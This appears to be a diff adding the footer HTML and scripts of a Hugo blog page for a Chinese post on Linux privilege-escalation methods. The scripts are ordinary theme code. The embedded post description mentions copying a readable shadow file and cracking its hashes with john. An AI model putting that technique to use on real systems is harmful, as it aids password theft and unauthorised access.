+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js"  ></script><script src="/js/aos.js"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "linux提权的各种手段",
+          url: "http:\/\/localhost:1313\/post\/%E6%8F%90%E6%9D%83\/linux%E6%8F%90%E6%9D%83%E7%9A%84%E5%90%84%E7%A7%8D%E6%8A%80%E5%B7%A7%E6%89%8B%E6%AE%B5\/",
+          description: "\r0x01 利用shdow文件提权\r当shadow可读取时，对其进行暴力破解 ​\t​\t将字串拷贝进文件，使用john进行破解即可，他会自动识别hash算法。如图，\n",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax ></script><script src="/js/tabs.js" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
